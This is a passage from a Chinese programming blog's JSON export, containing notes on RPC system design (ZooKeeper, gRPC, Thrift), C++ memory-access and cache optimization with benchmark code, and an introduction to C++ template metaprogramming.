hasattr(pws_or_pr, '__len__'): ... while True: sock, addr = serv_sock.accept() pw = pws[idx % len(pws)] # round robin 顺序发送 ... pw.sendmsg(msg, config) # Master 向子进程发送连接文件描述符 sock.close() # 关闭引用 idx += 1 ...else: # 子进程 while True: ... msg, ancdata, flags, addr = pr.recvmsg(bufsize, ancsize) ... # 从 pr 中读取客户端连接的文件描述符 fd # 在子进程中处理，建立套接字进行读写操作 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM, fileno=fd) ... # 处理连接请求 分布式系统中的RPC 当 RPC 服务部署在多个节点上时，客户端得到的是一个服务列表，有多个 IP 端口对。客户端的连接池可以随机地挑选任意的 RPC 服务节点进行连接。 设置服务节点权值，可以控制每个节点被客户端选中的概率。 系统容灾 客户端发起请求，当收到请求的节点挂掉时，将失效节点摘除，放置到失效节点列表中。每隔一段时间检查失效节点是否恢复了，如果恢复了，那就从失效节点中移除，再将节点地址重新加入到有效节点列表中。 判断节点是否失效的方法是，统计在一定时间窗口里出现的错误数量。如果这个数量过大，那就意味着失效了。之所以使用一个时间窗口，主要是防止由于网络的瞬间波动导致的请求异常，造成失效的误判。 请求重试策略 当请求失败时，客户端还要进行重试，但是也不可以无限重试，要有一定的重试策略。降权法是一种策略。 客户端会改变服务节点权值。如果某个节点出现了一次调用错误，可以对该节点进行降权（比如权值减半），直到达到一个最小值。 之所以不应该降到零，那是为了给节点提供一个恢复的机会。被降权的节点后来只要有一次调用成功，那么 weight 值就应该尽快被还原，快速恢复为正常节点。 考虑到网络波动的影响，降权不应太快，导致流量分配波动过快。 服务发现 即，增加物理机器节点时，可以动态变更当前节点列表，而不用手动配置，也不用重启系统。 服务发现技术依赖于服务之间的特殊中间节点。这个节点的作用就是接受服务的注册，提供服务的查找，以及服务列表变更的实时通知功能。它一般使用支持高可用的分布式配置数据库，如 zookeeper/etcd 等。 主要包括三个内容： 服务注册：服务节点在启动时将自己的服务地址注册到中间节点 服务查找：客户端启动时去中间节点查询服务地址列表 服务变更通知：当服务列表变更时，中间节点负责将变更信息实时通知给客户端。 ZooKeeper ZooKeeper 使用节点存储服务器的地址信息。ZooKeeper 的节点信息以树状结构存储在内存中。使用临时节点机制，支持短时间内断开重连，直到过期时间，若没有向临时节点发送指令，其将被删除。 ZooKeeper 提供了 watch 功能，在节点变动时，客户端可以收到通知，进而重加载服务列表。 一个分布式RPC简介 实现出一个 PreForking 异步模型的单机 RPC 服务器，单机服务器对子进程进行管理，信号监听和子进程回收等； 然后将服务挂接到 ZooKeeper 的树节点上； 再编写客户端消费者从 ZooKeeper 中读取服务节点地址，连接 RPC 服务器进行交互； 同时还要监听 ZooKeeper 树节点的变更，在 RPC 服务器节点变动时能动态调整服务列表地址。 gRPC简介 gRPC 选择 HTTP2.0 作为基础协议。HTTP2.0有一些特性，使得传输效率得到提升： HTTP2.0 是基于二进制协议的乱序模式 (Duplexing)。这意味同一个连接通道上多个请求并行时，服务器处理快的可以先返回而不用顺序等待。 HTTP2.0 对请求头的 key/value 做了字典处理，对于常用的 key/value 文本无需重复传送，而是通过引用内部字典的整数索引，显著节省了请求头传输流量。 HTTP2.0 使用分帧传送。同一个响应会有同一个 stream_id，消息接收端会将具有相同 stream_id 的消息帧串起来作为一个整体来处理。同一个连接上会有多个流穿插传输，相互之间互不影响。 消息协议使用 protobuf，这在前面有介绍。 gRPC 默认使用的是异步 IO 模型，底层有一个独立的事件循环。gRPC 使用开源异步事件框架 gevent。gevent 的优势在于可以让用户使用同步的代码编写异步的逻辑。 gRPC 的一个特色之处在于提供了 Streaming 模式（建立在 HTTP2.0 的 特性3 之上），客户端可以将一连串的请求连续发送到服务器，服务器也可以将一连串连续的响应回复给客户端。Streaming 可以理解为 gRPC 的异步调用。且 gRPC Streaming 为双工通信，可以同时收发消息，当然也可以单向 Streaming。 gRPC 对异常的处理方式是，在响应头帧里使用 Status 和 Status-Message 两个 header 来标识异常的 code 和原因。 gRPC 默认不支持重试，如果 RPC 调用遇到错误，会立即向上层抛出错误。若要重试，需要自行设计。 gRPC 默认支持超时选项，当客户端发起请求时，可以携带参数 timeout 指定最长响应时间，如果 timeout 时间内，服务器还没有返回结果，客户端就会抛出超时异常。 gRPC 在客户端和服务器都提供了拦截器选项，用户可以通过拦截器拦截请求和响应。比如客户端可以通过拦截器统一在请求头里面增加 metadata，服务器可以通过拦截器来跟踪 RPC 调用性能等。 具体细节，推荐查看 Documentation | gRPC 官方文档。 Thrift简介 12345678910111213+-------------------------------------------+| Server || (single-threaded, event-driven etc) |+-------------------------------------------+| Processor || (compiler generated) |+-------------------------------------------+| Protocol || (JSON, compact etc) |+-------------------------------------------+| Transport || (raw TCP, HTTP etc) |+-------------------------------------------+ Thrift 是一个全套的 RPC 框架，支持多种协议，多种传输模式和多种服务器模型。 Transport 层可以选择多种传输模式，Protocol 层可以选择多种协议。 Thrift 支持多种协议，有文本协议有二进制协议。 Thrift 支持多种服务器模式，上文所诉的所有模式，都支持。 Thrift 支持多种传输模式，除了普通的 TCP socket 之外，还有对 ssl 的支持等。通常在传输层使用缓冲模式，在序列化消息时，待完整的消息结构体序列化完成后调用 flush 方法才会将消息传递到对方，有助于提升 IO 效率。 Thrift 的协议文件要比 gRPC 简洁多了，参数和返回支持很多原生类型。gRPC 则必须使用指定类型，所以输入和输出都要定义 message 结构体。 Thrift 的超时机制是通过套接字的 timeout 属性来控制读写超时的，gRPC 则是通过定时器来控制的。Thrift 客户端一旦出现超时，就会关闭连接。 具体可参见 Apache Thrift - Concepts 官方文档。 与gRPC对比： 在协议的效率上 gRPC 基于 HTTP2.0 协议，这个肯定是无法抗衡 Thrift 纯粹的二进制协议的。 gRPC 的客户端是多路复用的线程安全的，可以拿过来直接使用。Thrift 的客户端还需要用户自己去封装一个连接池才能使用。 gRPC 虽然使用了稍微浪费流量的 HTTP2.0 协议，但是考虑到 HTTP 协议的广泛性，支持 HTTP2.0 的代理服务器中间件、负载均衡中间件很多，gRPC 可以直接透明地在这些中间件之间进行转发而无需进行复杂的协议转换工作。Thrift 兼容性就差的太远了。 Thrift 的源码要简单很多，它的 py 版本几乎全是纯粹的 Python 语言编写的，如果要研究源码的话，还是应该选择 Thrift。gRPC 的源码， c 语言实现，代码量很大，不如看 gRPC 的丰富的文档来得直接。","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"RPC","slug":"Notes/RPC","permalink":"https://racleray.github.io/categories/Notes/RPC/"}],"tags":[{"name":"Web","slug":"Web","permalink":"https://racleray.github.io/tags/Web/"},{"name":"RPC","slug":"RPC","permalink":"https://racleray.github.io/tags/RPC/"}],"author":"HeRui"},{"title":"C++访存优化","slug":"C-访存优化","date":"2023-06-19T14:30:42.000Z","updated":"2024-01-09T10:24:49.646Z","comments":true,"path":"posts/d47a1979.html","link":"","permalink":"https://racleray.github.io/posts/d47a1979.html","excerpt":"C++ 内存访问优化","text":"CPU-bound 与 Memory-bound CPU并行能加速计算，并不能加速内存读写。 常见读写和计算的时间花费对比： L1/2/3 read和Main RAM read的时间指的是读一个缓存行（64字节）所花费的时间。 一级缓存分为数据缓存和指令缓存，其中数据缓存有 32 KB，6 个物理核心每个都有一个，总共 192 KB。而指令缓存的大小刚好和数据缓存一样也是 192 KB。 二级缓存有 256 KB，6 个物理核心每个都有一个，总共 1.5 MB。 三级缓存由各个物理核心共享，总共 12 MB。 若从主存读取一个float，大约花费时间 125 / 64 * 4 = 8 个时钟周期。（125：从主存读取一个缓存行的时间，64：一个缓存行64字节，4：一个浮点数4字节） 也就是说想要避免 mem-bound 充分利用CPU核心的计算能力，就需要在计算任务部分有足够的计算量，使得计算花费时间不小于内存读写花费的时间。 另外，如果数据能够充分在高速缓存中读取，也能够起到避免 mem-bound 的作用。 缓存机制 读 缓存会查找和该地址匹配的条目。如果找到，则给CPU返回缓存中的数据。如果找不到，则向主内存发送请求，等读取到该地址的数据，就创建一个新条目。 在 x86 架构中每个条目的存储 64 字节的数据，这个条目又称之为缓存行（cacheline）。当访问 0x0048~0x0050 这 4 个字节时，实际会导致 0x0040~0x0080 的 64 字节数据整个被读取到缓存中。 为了不浪费缓存行的存储空间，可以把数据结构的起始地址和大小对齐到 64 字节。 设计数据结构时，应该把数据存储的尽可能紧凑，不要松散排列。最好每个缓存行里要么有数据，要么没数据，避免读取缓存行时浪费一部分空间没用。 写 缓存会查找和该地址匹配的条目。如果找到，则修改缓存中该地址的数据。如果找不到，则创建一个新条目来存储CPU写的数据，并标记为脏（dirty）。 当读和写创建的新条目过多，缓存快要塞不下时，他会把最不常用的那个条目移除，这个现象称为失效（invalid）。如果那个条目是被标记为脏的，则说明是当时打算写入的数据，那就需要向主内存发送写入请求，等他写入成功，才能安全移除这个条目。 有多级缓存，则一级缓存失效后会丢给二级缓存。 随机访问 例如对float进行访问，随机访问一个float值，而这导致他附近的64字节都被读取到缓存了，但实际只用到了其中4字节，之后又没用到剩下的60字节，导致浪费了94%的带宽。 解决方法就是，把数据按64字节大小分块。随机访问时，只随机块的位置，而块的内部仍然按顺序访问。 1234567891011121314151617181920212223242526272829303132333435363738#include &lt;iostream&gt;#include &lt;vector&gt;#include &lt;cmath&gt;#include &lt;cstring&gt;#include &lt;cstdlib&gt;#include &lt;array&gt;#include &lt;benchmark/benchmark.h&gt;#include &lt;x86intrin.h&gt;#include &lt;omp.h&gt;constexpr size_t n = 1&lt;&lt;27; // 512MBstd::vector&lt;float&gt; a(n);static uint32_t randomize(uint32_t i) &#123; i = (i ^ 61) ^ (i &gt;&gt; 16); i *= 9; i ^= i &lt;&lt; 4; i *= 0x27d4eb2d; i ^= i &gt;&gt; 15; return i;&#125;void BM_random_64B(benchmark::State &amp;bm) &#123; for (auto _: bm) &#123;#pragma omp parallel for for (size_t i = 0; i &lt; n / 16; i++) &#123; size_t r = randomize(i) % (n / 16); for (size_t j = 0; j &lt; 16; j++) &#123; benchmark::DoNotOptimize(a[r * 16 + j]); &#125; &#125; benchmark::DoNotOptimize(a); &#125;&#125;BENCHMARK(BM_random_64B);BENCHMARK_MAIN(); prefetch 当程序顺序访问 a[0], a[1] 时，CPU会智能地预测到你接下来可能会读取 a[2]，于是会提前给缓存发送一个读取指令，让他读取 a[2]、a[3]。 这样等 a[0], a[1] 处理完以后，缓存也刚好读取完 a[2] 了，从而CPU不用等待，就可以直接开始处理 a[2]，避免等待数据的时候CPU空转浪费时间。 一般来说只有线性的地址访问规律（包括顺序、逆序；连续、跨步(按固定间隔跳跃)）能被识别出来，而如果你的访存是随机的，那就没办法预测。 对于不得不随机访问很小一块的情况，可以通过 _mm_prefetch 指令手动预取一个缓存行。 如果 prefetch 成功，就可以在计算的同时，提前准备好下一次计算的数据，不至于CPU空转，同时将较短的CPU计算时间消耗，隐藏在内存读写的过程中。 内存页 现在操作系统管理内存是用分页（page），程序的内存是一页一页贴在地址空间中的，有些地方可能不可访问，或者还没有分配，则把这个页设为不可用状态，访问他就会出错，进入内核模式。 prefetch不能跨越页边界，否则可能会触发不必要的 page fault。 可以用 _mm_alloc 申请起始地址对齐到页边界的一段内存。 当随机访问数据时，可以按4KB大小的块随机访问，在块内部就可以顺序访问，发挥prefetch的优势。 1234567891011121314151617181920212223242526272829303132#include &lt;iostream&gt;#include &lt;vector&gt;#include &lt;cmath&gt;#include &lt;cstring&gt;#include &lt;cstdlib&gt;#include &lt;array&gt;#include &lt;benchmark/benchmark.h&gt;#include &lt;x86intrin.h&gt;#include &lt;omp.h&gt;constexpr size_t n = 1&lt;&lt;27; // 512MBstd::vector&lt;float&gt; a(n);void BM_random_4KB_aligned(benchmark::State &amp;bm) &#123; float *a = (float *)_mm_malloc(n * sizeof(float), 4096); memset(a, 0, n * sizeof(float)); for (auto _: bm) &#123;#pragma omp parallel for for (size_t i = 0; i &lt; n / 1024; i++) &#123; size_t r = randomize(i) % (n / 1024); for (size_t j = 0; j &lt; 1024; j++) &#123; benchmark::DoNotOptimize(a[r * 1024 + j]); &#125; &#125; benchmark::DoNotOptimize(a); &#125; _mm_free(a);&#125;BENCHMARK(BM_random_4KB_aligned);BENCHMARK_MAIN(); 为什么写入比读取慢？ 因为缓存和内存通信的最小单位是缓存行：64字节。当CPU试图写入4字节时，因为剩下的60字节没有改变，缓存不知道CPU接下来会不会用到那60字节，因此他只好从内存读取完整的64字节，修改其中的4字节为CPU给的数据，之后再择机写回。 写入少于64字节的数据时，虽然没有用到全部的读取数据，但实际上缓存还是从内存读取了，从而浪费了2倍带宽。 _mm_stream_si32 绕过缓存，直接写入。用 _mm_stream_si32 指令代替直接赋值的写入，他能够绕开缓存，将一个4字节的写入操作，挂起到临时队列，等凑满64字节后，直接写入内存，从而完全避免读的带宽。只支持int做参数，要用float还得转换一下指针类型。 _mm 系列指令出自 &lt;xmmintrin.h&gt; 头文件。指令的文档 Intel Intrinsics Guide。 12345678910111213141516171819202122232425262728#include &lt;iostream&gt;#include &lt;vector&gt;#include &lt;cmath&gt;#include &lt;cstring&gt;#include &lt;cstdlib&gt;#include &lt;array&gt;#include &lt;benchmark/benchmark.h&gt;#include &lt;x86intrin.h&gt;#include &lt;omp.h&gt;constexpr size_t n = 1&lt;&lt;27; // 512MBstd::vector&lt;float&gt; a(n);void BM_write_stream_then_read(benchmark::State &amp;bm) &#123; for (auto _: bm) &#123;#pragma omp parallel for for (size_t i = 0; i &lt; n; i++) &#123; float value = 1; _mm_stream_si32((int *)&amp;a[i], *(int *)&amp;value); benchmark::DoNotOptimize(a[i]); &#125; benchmark::DoNotOptimize(a); &#125;&#125;BENCHMARK(BM_write_stream_then_read);BENCHMARK_MAIN(); 因为 _mm_stream_si32 会绕开缓存，直接把数据写到内存，之后读取的话，反而需要等待 stream 写回执行完成，然后重新读取到缓存，反而更低效。 因此，仅当这些情况： 该数组只有写入，之前完全没有读取过。 之后没有再读取该数组的地方。 才应该用 stream 指令。 另外，_mm_stream_ps 可以一次性写入 16 字节到挂起队列，更加高效。不过，_mm_stream_ps 写入的地址必须对齐到 16 字节，否则会产生段错误等异常。 注意，stream 系列指令写入的地址，必须是连续的，中间不能有跨步（固定间隔），否则无法合并写入，会产生有中间数据读的带宽。 为什么对数组写入全1比全0慢？ 因为写入0被编译器自动优化成了memset，而memset内部利用了stream指令得以更快写入。而全1并不会调用stream指令。 可以手动调用stream指令写入全1。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748#include &lt;iostream&gt;#include &lt;vector&gt;#include &lt;cmath&gt;#include &lt;cstring&gt;#include &lt;cstdlib&gt;#include &lt;array&gt;#include &lt;benchmark/benchmark.h&gt;#include &lt;x86intrin.h&gt;#include &lt;omp.h&gt;constexpr size_t n = 1&lt;&lt;27; // 512MBstd::vector&lt;int&gt; a(n);void BM_write0(benchmark::State &amp;bm) &#123; for (auto _: bm) &#123;#pragma omp parallel for for (size_t i = 0; i &lt; n; i++) &#123; a[i] = 0; &#125; benchmark::DoNotOptimize(a); &#125;&#125;BENCHMARK(BM_write0);void BM_write1(benchmark::State &amp;bm) &#123; for (auto _: bm) &#123;#pragma omp parallel for for (size_t i = 0; i &lt; n; i++) &#123; a[i] = 1; &#125; benchmark::DoNotOptimize(a); &#125;&#125;BENCHMARK(BM_write1);void BM_write1_streamed(benchmark::State &amp;bm) &#123; for (auto _: bm) &#123;#pragma omp parallel for for (size_t i = 0; i &lt; n; i++) &#123; _mm_stream_si32(&amp;a[i], 1); &#125; benchmark::DoNotOptimize(a); &#125;&#125;BENCHMARK(BM_write1_streamed);BENCHMARK_MAIN(); 循环代码优化 当对同一个数组，执行两种操作，在不影响逻辑时，将两个循环写成一个循环可以加速 mem-bound 的程序执行。 在主存看来， CPU做的事情相当于：读+写+读+写，每个元素都需要访问四遍内存，变成了：读+写，从而每个元素只需要访问两遍内存。 同时，可以利用SIMD优化（编译器优化笔记部分），比如 gcc unroll、局部变量并行批处理。 内存的分配 当调用 malloc 时，操作系统并不会实际分配那一块内存，而是将这一段内存标记为“不可用”。当用户试图访问（写入）这一片内存时，硬件就会触发所谓的缺页中断（page fault），进入操作系统内核，内核会查找当前进程的 malloc 历史记录。 如果发现用户写入的地址是他曾经 malloc 过的地址区间，则执行实际的内存分配，并标记该段内存为“可用”，下次访问就不会再产生缺页中断了；而如果用户写入的地址根本不是他 malloc 过的地址，那就说明他确实犯错了，就抛出段错误（segmentation fault）。 当执行代码 std::vector、new intn 会初始化数组为0，实际分配内存。 malloc(n * sizeof(int))、new int[n] 不会初始化数组为0，不会实际分配内存。 第一次往malloc的数组里面赋值时，因为这时操作系统还没有给这个数组分配内存，所以会触发缺页中断，进入操作系统内核给数组分配内存，是内核执行内存分配的这个动作，会花费额外的时间。 按页分配 当一个尚且处于“不可用”的 malloc 过的区间被访问，操作系统不是把整个区间全部分配完毕，而是只把当前写入地址所在的页面（4KB 大小）给分配上。 也就是说用户访问 a[0] 以后只分配了 4KB 的内存。等到用户访问了 a[1024]，也就是触及了下一个页面，他才会继续分配一个 4KB 的页面，这时才实际分配 8KB 。 比如malloc申请 16GB 内存，但是只访问了他的前 4KB，这样只有一个页被分配，所以非常快。 内存重复利用 即使第二次分配的是同一段差不多大小的内存（第一次分配内存不会再使用），也是会产生缺页中断，花费分配时间的。 这就需要改动STL容器的allocator。tbb::cache_aligned_allocator 可以提升一定的性能。最大好处在于他分配的内存地址，永远会对齐到缓存行（64字节）。 标准库的 new 和 malloc 可以保证 16 字节对齐。 12345678910111213141516171819202122#include &lt;iostream&gt;#include &lt;vector&gt;#include \"ticktock.h\"#include &lt;cstdlib&gt;constexpr size_t n = 1&lt;&lt;20;int main() &#123; std::cout &lt;&lt; std::boolalpha; for (int i = 0; i &lt; 5; i++) &#123; std::vector&lt;int&gt; arr(n); bool is_aligned = (uintptr_t)arr.data() % 16 == 0; std::cout &lt;&lt; \"std: \" &lt;&lt; is_aligned &lt;&lt; std::endl; &#125; for (int i = 0; i &lt; 5; i++) &#123; auto arr = (int *)malloc(n * sizeof(int)); bool is_aligned = (uintptr_t)arr % 16 == 0; std::cout &lt;&lt; \"malloc: \" &lt;&lt; is_aligned &lt;&lt; std::endl; free(arr); &#125; return 0;&#125; 还有 _mm_malloc(n, aalign) 可以分配对齐到任意 aalign 字节的内存。他在 &lt;xmmintrin.h&gt; 这个头文件里。是 x86 特有的，并且需要通过 _mm_free 来释放。 还有一个跨平台版本（比如用于 arm 架构）的 aligned_alloc(align, n)，他也可以分配对齐到任意 align 字节的内存，通过 free 释放。 123456789101112131415161718192021222324#include &lt;iostream&gt;#include &lt;vector&gt;#include \"ticktock.h\"#include &lt;cstdlib&gt;#include &lt;x86intrin.h&gt;constexpr size_t n = 1&lt;&lt;20;int main() &#123; std::cout &lt;&lt; std::boolalpha; for (int i = 0; i &lt; 5; i++) &#123; auto arr = (int *)_mm_malloc(n * sizeof(int), 4096); bool is_aligned = (uintptr_t)arr % 4096 == 0; std::cout &lt;&lt; \"_mm_malloc: \" &lt;&lt; is_aligned &lt;&lt; std::endl; _mm_free(arr); &#125; for (int i = 0; i &lt; 5; i++) &#123; auto arr = (int *)aligned_alloc(4096, n * sizeof(int)); bool is_aligned = (uintptr_t)arr % 4096 == 0; std::cout &lt;&lt; \"aligned_alloc: \" &lt;&lt; is_aligned &lt;&lt; std::endl; free(arr); &#125; return 0;&#125; 利用 aligned_alloc 可以实现任意对齐的allocator。stackoverflow链接。 使用这个allocator，可以改变容器的内存分配布局。 123456789101112131415161718192021#include &lt;iostream&gt;#include &lt;vector&gt;#include \"ticktock.h\"#include \"alignalloc.h\"constexpr size_t n = 1&lt;&lt;20;int main() &#123; std::cout &lt;&lt; std::boolalpha; for (int i = 0; i &lt; 5; i++) &#123; std::vector&lt;int, AlignedAllocator&lt;int&gt;&gt; arr(n); bool is_aligned = (uintptr_t)arr.data() % 64 == 0; std::cout &lt;&lt; \"64: \" &lt;&lt; is_aligned &lt;&lt; std::endl; &#125; for (int i = 0; i &lt; 5; i++) &#123; std::vector&lt;int, AlignedAllocator&lt;int, 4096&gt;&gt; arr(n); bool is_aligned = (uintptr_t)arr.data() % 4096 == 0; std::cout &lt;&lt; \"4096: \" &lt;&lt; is_aligned &lt;&lt; std::endl; &#125; return 0;&#125; 临时数组优化 如果一个经常调用的函数中，申请了临时数组，可以优化，使得不用每次都重新分配一段内存，浪费时间。 声明为 static 变量，这样第二次进入 func 的时候还是同一个数组，不需要重复分配内存； thread_local 表示如有多个线程，每个线程保留一个 tmp 对象的副本，防止多线程调用 func 出错。 返回时（或者进入时）调用 tmp.clear() 清除已有数据。由于 vector 的特性，他只会把 size() 标记为 0 并调用其成员的解构函数，而不会实际释放内存（free）。 第二次进入的时候，如果 n 不超过上一次的大小，就还是用的第一次分配的内存，避免了重新分配的开销。 1234567891011121314151617181920212223242526#include &lt;iostream&gt;#include &lt;vector&gt;#include &lt;cmath&gt;#include &lt;algorithm&gt;#include \"ticktock.h\"float func(int n) &#123; // 优化 static thread_local std::vector&lt;float&gt; tmp; for (int i = 0; i &lt; n; i++) &#123; tmp.push_back(i / 15 * 2.718f); &#125; std::reverse(tmp.begin(), tmp.end()); float ret = tmp[32]; // 优化 tmp.clear(); return ret;&#125;int main() &#123; constexpr int n = 1&lt;&lt;25; std::cout &lt;&lt; func(n) &lt;&lt; std::endl; return 0;&#125; 二维数组 C++/C 对二维数组分配内存是一维的，并没有二级指针的必要，时间和空间效率都比较低（没有冒犯 java 的意思）。 C++/C 范围是按照行主序，也就是说，a[i][j] 翻译为 a[i * num_of_column + j]。也就是说先遍历 j ，可以连续访问内存，缓存利用率高。而如果先访问 i ，就变成了跳跃内存地址的访问。 一个优化的ndarray封装，针对图像处理需要，增加了边界扩充设计，方便SIMD矢量化。 矩阵乘法优化 直观实现 12345678910111213141516171819202122232425262728293031#include &lt;iostream&gt;#include &lt;vector&gt;#include &lt;cmath&gt;#include &lt;cstring&gt;#include &lt;cstdlib&gt;#include &lt;array&gt;#include &lt;benchmark/benchmark.h&gt;#include &lt;x86intrin.h&gt;#include &lt;omp.h&gt;#include \"ndarray.h\"constexpr int n = 1&lt;&lt;10;ndarray&lt;2, float&gt; a(n, n);ndarray&lt;2, float&gt; b(n, n);ndarray&lt;2, float&gt; c(n, n);void BM_matmul(benchmark::State &amp;bm) &#123; for (auto _: bm) &#123; for (int j = 0; j &lt; n; j++) &#123; for (int i = 0; i &lt; n; i++) &#123; for (int t = 0; t &lt; n; t++) &#123; a(i, j) += b(i, t) * c(t, j); &#125; &#125; &#125; &#125;&#125;BENCHMARK(BM_matmul);BENCHMARK_MAIN(); a(i, j) 始终在一个地址不动（一般），如果有多个i值同时处理会更好。 b(i, t) 每次跳跃 n 间隔的访问（坏）。 c(t, j) 连续的顺序访问（好）。 因为存在不连续的 b 和一直不动的 a，导致矢量化失败，一次只能处理一个标量，CPU也无法启动指令级并行（ILP）。 对循环进行分块，再看看访存的规律： 12345678910111213141516171819// ...void BM_matmul_blocked(benchmark::State &amp;bm) &#123; for (auto _: bm) &#123; for (int j = 0; j &lt; n; j++) &#123; for (int iBase = 0; iBase &lt; n; iBase += 32) &#123; for (int t = 0; t &lt; n; t++) &#123; for (int i = iBase; i &lt; iBase + 32; i++) &#123; a(i, j) += b(i, t) * c(t, j); &#125; &#125; &#125; &#125; &#125;&#125;BENCHMARK(BM_matmul_blocked);BENCHMARK_MAIN(); a(i, j) 连续 32 次顺序访问（好）。 b(i, t) 连续 32 次顺序访问（好）。 c(t, j) 32 次在一个地址不动（一般）。 这样就消除不连续的访问了，从而内部的 i 循环可以顺利矢量化，且多个循环体之间没有依赖关系，CPU得以启动指令级并行，缓存预取也能正常工作。 甚至可以进一步将 j 也分块化： 12345678910111213141516void BM_matmul_blocked_both(benchmark::State &amp;bm) &#123; for (auto _: bm) &#123; for (int jBase = 0; jBase &lt; n; jBase += 16) &#123; for (int iBase = 0; iBase &lt; n; iBase += 16) &#123; for (int j = jBase; j &lt; jBase + 16; j++) &#123; for (int t = 0; t &lt; n; t++) &#123; for (int i = iBase; i &lt; iBase + 16; i++) &#123; a(i, j) += b(i, t) * c(t, j); &#125; &#125; &#125; &#125; &#125; &#125;&#125;BENCHMARK(BM_matmul_blocked_both); morton code 如果对矩阵进行转置，应该使用行主序还是列主序？显然必有一个矩阵读写会很不友好。 morton code 使用一个时间变量 t，生成下一个访问元素 (x, y) 坐标，尽量保证数据在时间 t 上是接近的，同时二维空间上 (x,y) 也是接近的，利用访存局域性，发挥缓存优势。 多核下的缓存 如果多个核心同时访问的地址非常接近，这时候会变得很慢。 因为 CPU 之间通信的最小单位也是 缓存行（64 字节），如果两个核心访问到了的同一缓存行，假设一个核心修改了该缓存行的前32字节，另一个修改了后32字节，同时写回，只有一个会生效。 所以CPU为了安全起见，同时只能允许一个核心写入同一地址的缓存行。从而导致读写这个变量的速度受限于三级缓存的速度，而不是一级缓存的速度。不能同时写，只有再取一次。 错误共享只会发生在写入的情况，如果多个核心同时读取两个很靠近的变量，是不会产生冲突的，也没有性能损失。 优化 只需要把每个核心写入的地址尽可能分散开了就行了。比如这里，我们把每个核心访问的地方跨越 16KB （足够远就行），这样CPU就知道每个核心之间不会发生冲突，从而可以放心地放在一级缓存里，不用担心会不会和其他核心共用了一个缓存行了。","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"C++","slug":"Notes/C","permalink":"https://racleray.github.io/categories/Notes/C/"}],"tags":[{"name":"C++","slug":"C","permalink":"https://racleray.github.io/tags/C/"},{"name":"memory manage","slug":"memory-manage","permalink":"https://racleray.github.io/tags/memory-manage/"}],"author":"HeRui"},{"title":"C++模版元编程","slug":"C-模版元编程","date":"2023-06-02T14:34:53.000Z","updated":"2024-01-09T10:24:49.642Z","comments":true,"path":"posts/9de18668.html","link":"","permalink":"https://racleray.github.io/posts/9de18668.html","excerpt":"C++ 模版元编程","text":"模板元编程 模板函数自动推导参数类型。有时候，一个统一的实现满足不了某些特殊情况。只需添加一个 特化的重载、 1234567891011121314151617#include &lt;iostream&gt;template &lt;class T&gt;T twice(T t) &#123; return t * 2;&#125;std::string twice(std::string t) &#123; return t + t;&#125;int main() &#123; std::cout &lt;&lt; twice(21) &lt;&lt; std::endl; std::cout &lt;&lt; twice(3.14f) &lt;&lt; std::endl; std::cout &lt;&lt; twice(2.718) &lt;&lt; std::endl; std::cout &lt;&lt; twice(\"hello\") &lt;&lt; std::endl;&#125; 但是这样也有一个问题，那就是如果我用 twice(“hello”) 这样去调用，他不会自动隐式转换到 std::string 并调用那个特化函数，而是会去调用模板函数 twice&lt;char *&gt;(“hello”)，从而出错。 使用SFINAE机制，可以解决，比如利用 has_reserve 可以用来配合 enale_if 实现编译期的阻断，就是说，根据模板是否能成功展开，选择不同的编译目标代码段： 123456789101112131415161718192021222324252627282930// template&lt;class T&gt;// struct enable_if&lt;true, T&gt; &#123; typedef T type; &#125;;// template&lt;bool B, class T = void&gt;// struct enable_if &#123;&#125;;// template&lt; bool B, class T = void &gt;// using enable_if_t = typename enable_if&lt;B,T&gt;::type;// 是 C 类型template &lt;typename C, typename T&gt;enable_if_t&lt;has_reserve&lt;C&gt;::value, void&gt;append(C&amp; container, T* ptr, size_t size)&#123; container.reserve( container.size() + size); ...&#125;// 不是 C 类型template &lt;typename C, typename T&gt;enable_if_t&lt;!has_reserve&lt;C&gt;::value, void&gt;append(C&amp; container, T* ptr, size_t size)&#123; ....&#125; 默认参数类型 可以通过 template &lt;class T = int&gt; 表示调用者没有指定时，T 默认为 int 12345678910111213#include &lt;iostream&gt;template &lt;class T = int&gt;T two() &#123; return 2;&#125;int main() &#123; std::cout &lt;&lt; two&lt;int&gt;() &lt;&lt; std::endl; std::cout &lt;&lt; two&lt;float&gt;() &lt;&lt; std::endl; std::cout &lt;&lt; two&lt;double&gt;() &lt;&lt; std::endl; std::cout &lt;&lt; two() &lt;&lt; std::endl; // 等价于 two&lt;int&gt;()&#125; 整数也可以作为参数，不过模板参数只支持整数类型（包括 enum）。 浮点类型、指针类型，不能声明为模板参数。 1234567891011121314#include &lt;iostream&gt;template &lt;int N = 1, class T&gt;void show_times(T msg) &#123; for (int i = 0; i &lt; N; i++) &#123; std::cout &lt;&lt; msg &lt;&lt; std::endl; &#125;&#125;int main() &#123; show_times(\"one\"); show_times&lt;3&gt;(42); show_times&lt;4&gt;('%');&#125; 1234567891011121314#include &lt;iostream&gt;template &lt;int N = 1, class T&gt;void show_times(T msg) &#123; for (int i = 0; i &lt; N; i++) &#123; std::cout &lt;&lt; msg &lt;&lt; std::endl; &#125;&#125;int main() &#123; show_times(\"one\"); show_times&lt;3&gt;(42); show_times&lt;4&gt;('%');&#125; 参数部分特化 func(vector t) 这样则可以限定仅仅为 vector 类型的参数。 123456789101112131415161718#include &lt;iostream&gt;#include &lt;vector&gt;template &lt;class T&gt;T sum(std::vector&lt;T&gt; const &amp;arr) &#123; T res = 0; for (int i = 0; i &lt; arr.size(); i++) &#123; res += arr[i]; &#125; return res;&#125;int main() &#123; std::vector&lt;int&gt; a = &#123;4, 3, 2, 1&#125;; std::cout &lt;&lt; sum(a) &lt;&lt; std::endl; std::vector&lt;float&gt; b = &#123;3.14f, 2.718f&#125;; std::cout &lt;&lt; sum(b) &lt;&lt; std::endl;&#125; 这里用了 const &amp; 避免不必要的的拷贝。 为什么要支持整数作为模板参数 template 传入的 N，是一个编译期常量，每个不同的 N，编译器都会单独生成一份代码，从而可以对他做单独的优化。 而 func(int N)，则变成运行期常量，编译器无法自动优化，只能运行时根据被调用参数 N 的不同。 比如 show_times&lt;0&gt;() 编译器就可以自动优化为一个空函数。因此模板元编程对高性能编程很重要。 通常来说，模板的内部实现需要被暴露出来，除非使用特殊的手段，否则，定义和实现都必须放在头文件里。 